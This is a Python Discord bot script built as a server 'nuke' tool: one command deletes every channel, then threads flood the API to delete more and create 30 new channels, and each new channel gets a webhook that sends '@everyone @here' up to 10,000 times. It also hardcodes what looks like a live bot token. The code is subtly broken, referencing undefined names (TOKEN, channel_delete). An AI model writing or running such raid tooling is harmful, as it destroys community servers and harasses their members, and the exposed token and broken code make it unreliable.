import discord
from discord.ext import commands
import threading
import requests

intents = discord.Intents.all()  # Enable all intents

bot_token = 'MTE5MDY1MjU5OTg4NDU4MjkxMg.GhrwIU.FctZjGjc-jte9NM4gYJY-_yoaUZWJrIgBm8xHM'
webname = 'Kord'
spamdata = '@everyone @here'

bot = commands.Bot(command_prefix='@', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()

    def cc(i):
        json = {
            "name": i
        }
        requests.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers={'Authorization': f'Bot {TOKEN}'},
            json=json
        )

    for i in range(30):
        for channel in list(ctx.guild.channels):
            threading.Thread(
                target=channel_delete,
                args=(channel.id,)
            ).start()
    for i in range(30):
        threading.Thread(
            target=cc,
            args=(f'channel_{i}',)
        ).start()

@bot.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name=webname)
        for i in range(10000):
            await webhook.send(spamdata)
    except:
        print("Ratelimited")

bot.run(TOKEN)
